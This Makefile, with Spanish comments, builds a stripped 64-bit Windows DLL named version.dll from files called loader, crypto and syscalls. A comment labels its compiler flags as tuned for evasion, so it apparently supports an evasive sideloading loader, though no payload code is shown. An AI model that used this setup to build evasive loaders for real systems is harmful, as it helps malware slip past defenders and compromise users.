CXX = x86_64-w64-mingw32-g++
NASM = nasm

# Flags de Compilación Hardenizados para Evasión
CFLAGS = -O3 -s -mwindows -m64 -fno-asynchronous-unwind-tables \
         -fno-exceptions -fno-rtti -fmerge-all-constants \
         -fvisibility=hidden -ffunction-sections -fdata-sections \
         -I./src

# Flags de Linker para ASLR/DEP y Stripping
LDFLAGS = -shared -static-libgcc -static-libstdc++ \
          -Wl,--strip-all -Wl,--discard-all \
          -Wl,--dynamicbase -Wl,--nxcompat \
          -Wl,--high-entropy-va -Wl,--subsystem,windows

SRC_FILES = src/loader.cpp src/crypto.cpp
ASM_FILES = src/syscalls.asm
OBJ_FILES = bin/loader.o bin/syscalls.o bin/crypto.o

all: bin/version.dll

bin/loader.o: src/loader.cpp
	$(CXX) $(CFLAGS) -c $< -o $@

bin/crypto.o: src/crypto.cpp
	$(CXX) $(CFLAGS) -c $< -o $@

bin/syscalls.o: src/syscalls.asm
	$(NASM) -f win64 $< -o $@

bin/version.dll: $(OBJ_FILES)
	$(CXX) $(OBJ_FILES) $(LDFLAGS) -o $@

clean:
	rm -f bin/*.o bin/*.dll
